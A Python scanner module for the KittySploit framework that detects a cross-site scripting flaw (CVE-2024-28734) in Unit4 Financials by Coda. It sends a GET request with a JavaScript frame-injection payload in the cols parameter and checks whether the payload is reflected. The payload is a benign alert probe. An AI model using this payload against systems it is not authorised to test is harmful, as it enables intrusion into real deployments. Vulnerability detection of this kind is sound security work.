#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cross Site Scripting vulnerability in Unit4 Financials by Coda v."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Coda v.2024Q1 - Cross-Site Scripting Detection',
        'description': 'Cross Site Scripting vulnerability in Unit4 Financials by Coda v.2024Q1 allows a remote attacker to escalate privileges via a crafted script to the cols parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'packetstorm', 'cve', 'cve2024', 'coda', 'xss', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/177619/Financials-By-Coda-Cross-Site-Scripting.html',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-28734',
            'http://financials.com',
            'http://unit4.com',
        ],
        'cve': 'CVE-2024-28734',
    }

    def run(self):
        path = '/coda/frameset?cols="><frame%20src="javascript:alert(document.domain)">'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<frameset cols=""><frame src="javascript:alert(document.domain)">',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Coda v.2024Q1 - Cross-Site Scripting detected', path=path)
            return True
        return False

